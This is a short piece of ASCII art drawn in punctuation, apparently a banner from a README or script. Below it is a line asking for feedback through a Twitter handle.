                   / , ~ . ^ `~`\:::::::::::<<~>-,,`,    `-,  ``,_    }
                /~~ . `  . ~  , .`~~\:::::::;    _-~  ;__,        `,-`
       /`\    /~,  . ~ , '  `  ,  .` \::::;`   <<<~```   ``-,,__   ;
      /` .`\ /` .  ^  ,  ~  ,  . ` . ~\~                       \\, `,__
     / ` , ,`\.  ` ~  ,  ^ ,  `  ~ . . ``~~~`,                   `-`--, \
    / , ~ . ~ \ , ` .  ^  `  , . ^   .   , ` .`-,___,---,__            ``
  /` ` . ~ . ` `\ `  ~  ,  .  ,  `  ,  . ~  ^  ,  .  ~  , .`~---,___
/` . `  ,  . ~ , \  `  ~  ,  .  ^  ,  ~  .  `  ,  ~  .  ^  ,  ~  .  `-,

	Contact me via Twitter @zayotic to give feedback!

# 
```
